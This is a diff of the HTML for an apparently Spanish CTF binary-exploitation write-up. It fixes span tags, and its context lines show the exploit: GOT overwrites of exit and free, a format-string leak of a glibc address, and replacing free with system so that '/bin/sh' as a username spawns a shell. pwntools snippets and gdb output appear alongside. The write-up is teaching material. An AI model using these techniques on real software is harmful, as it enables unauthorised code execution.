@@ -328,7 +328,7 @@ Are you sure about your username choice? (y/n)
 
 New username size: ^C
 Program received signal SIGINT, Interrupt.
-<span class="code-dark-blue">0x00007ffff7ea7992</span> in <span class="code-dark-yellow">read</span> () from <span class="code-dark-green">./libc.so.6
+<span class="code-dark-blue">0x00007ffff7ea7992</span> in <span class="code-dark-yellow">read</span> () from <span class="code-dark-green">./libc.so.6</span>
 </code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>x/40gx (void *) curr_user
 <span class="code-dark-blue">0x408480</span>:       0x6161616161616161      0x6161616161616162  
 <span class="code-dark-blue">0x408490</span>:       0x6161616161616163      0x6161616161616164
@@ -679,7 +679,7 @@ selection: 4
 
 [<span class="code-dark-blue">*</span>] Current Role: Technician
 
-<span class="code-white">Option [1-5]: <span class="code-red">$</span> 1
+<span class="code-white">Option [1-5]: </span><span class="code-red">$</span> 1
 selection: 1
 
 Engine number [0-3]: <span class="code-red">$</span> 9
@@ -694,7 +694,7 @@ Do you want to save the configuration? (y/n)
 
 [<span class="code-dark-blue">*</span>] Current Role: Technician
 
-<span class="code-white">Option [1-5]: <span class="code-red">$</span>
+<span class="code-white">Option [1-5]: </span><span class="code-red">$</span>
 </code></pre></div><p>Esto es interesante pero no fue necesario.</p><p>Para filtrar direcciones dentro de Glibc, mi enfoque era usar <code>printf</code> en algún lugar donde pudiera controlar el primer argumento. La única función que encontré que no rompía el programa fue <code>free</code> en <code>user_edit</code>. Ahora el problema es llamar <code>user_edit</code>. Lo que hice fue establecer la dirección de <code>user_edit</code> en la entrada de la GOT de <code>exit</code>.</p><p>Entonces, usando una opción no válida, el programa irá a <code>user_edit</code>, ingresaremos un <em>payload</em> de <em>Format String</em> para filtrar valores de la pila y en lugar de <code>free</code>, el programa llamará a <code>printf</code>, mostrando las direcciones en la pantalla. Después de eso, el programa volverá al menú.</p><p>La elección de <code>exit</code> y <code>free</code> fue realmente buena porque se usan muy poco en la funcionalidad principal del programa. Vamos a depurar un poco:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk8 mtku">gdb</span><span class="mtk1">.</span><span class="mtk8">attach</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk4">'continue'</span><span class="mtk1">)</span>
 <span class="mtk1">    </span><span class="mtk8">write_what_where</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, (</span><span class="mtk1">elf</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.user_edit, </span><span class="mtk1">elf</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.user_edit), </span><span class="mtk1">elf</span><span class="mtk1">.</span><span class="mtk1">got</span><span class="mtk1">.exit)</span>  
 <span class="mtk1">    </span><span class="mtk8">write_what_where</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, (</span><span class="mtk1">elf</span><span class="mtk1">.</span><span class="mtk1">plt</span><span class="mtk1">.printf, </span><span class="mtk1">elf</span><span class="mtk1">.</span><span class="mtk1">plt</span><span class="mtk1">.printf), </span><span class="mtk1">elf</span><span class="mtk1">.</span><span class="mtk1">got</span><span class="mtk1">.free)</span>
@@ -719,7 +719,7 @@ Do you want to save the configuration? (y/n)
 
 [<span class="code-dark-blue">*</span>] Current Role: Technician
 
-<span class="code-white">Option [1-5]: <span class="code-red">$</span>
+<span class="code-white">Option [1-5]: </span><span class="code-red">$</span>
 </code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>got
 
 GOT protection: Partial RelRO | GOT functions: 20
@@ -748,7 +748,7 @@ GOT protection: Partial RelRO | GOT functions: 20
 <span class="code-dark-blue">0x4018ed</span> &lt;<span class="code-dark-yellow">user_edit</span>&gt;:   0xfa1e0ff3
 <span class="code-green">gef➤  </span>x 0x4011e4
 <span class="code-dark-blue">0x4011e4</span> &lt;<span class="code-dark-yellow">printf@plt</span>+4&gt;:        0x6525fff2
-</code></pre></div><p>Muy bien, así que si usamos una opción no válida, iremos <code>user_edit</code>, Y nuestro nombre de usuario irá a <code>printf</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-white">Option [1-5]: <span class="code-red">$</span> 0
+</code></pre></div><p>Muy bien, así que si usamos una opción no válida, iremos <code>user_edit</code>, Y nuestro nombre de usuario irá a <code>printf</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-white">Option [1-5]: </span><span class="code-red">$</span> 0
 selection: 0
 [<span class="code-dark-red">!</span>] Invalid option
 
@@ -764,7 +764,7 @@ Enter your new username: <span class="code-red">$</span> %lx.%lx.%lx.%lx.%lx.%lx
 
 [<span class="code-dark-blue">*</span>] Current Role: Technician
 
-<span class="code-white">Option [1-5]: <span class="code-red">$</span>
+<span class="code-white">Option [1-5]: </span><span class="code-red">$</span>
 </code></pre></div><p>Perfecto, tenemos una dirección Glibc en el tercer lugar. Veamos qué función es la que usa en GDB:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>x 0x7f038ac7da37
 <span class="code-dark-blue">0x7f038ac7da37</span> &lt;<span class="code-dark-yellow">write</span>+23&gt;:      0xf0003d48  
 </code></pre></div><p>Vale, <code>write+23</code>. Con esto, ahora podemos calcular la dirección base de Glibc:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Option [1-5]: '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'0'</span><span class="mtk1">)</span>
@@ -796,7 +796,7 @@ Enter your new username: <span class="code-red">$</span> %lx.%lx.%lx.%lx.%lx.%lx
 
 [<span class="code-dark-blue">*</span>] Current Role: Technician
 
-<span class="code-white">Option [1-5]: <span class="code-red">$</span>
+<span class="code-white">Option [1-5]: </span><span class="code-red">$</span>
 </code></pre></div><h3 id="obteniendo-rce">Obteniendo RCE</h3><p>En este punto, podemos sobrescribir la GOT nuevamente para establecer <code>free</code> a <code>system</code> e introducir <code>/bin/sh</code> como nombre de usuario:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk8">write_what_where</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, (</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.system, </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.system), </span><span class="mtk1">elf</span><span class="mtk1">.</span><span class="mtk1">got</span><span class="mtk1">.free)</span>  
 <span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Option [1-5]: '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'0'</span><span class="mtk1">)</span>
 <span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'New username size: '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'200'</span><span class="mtk1">)</span>
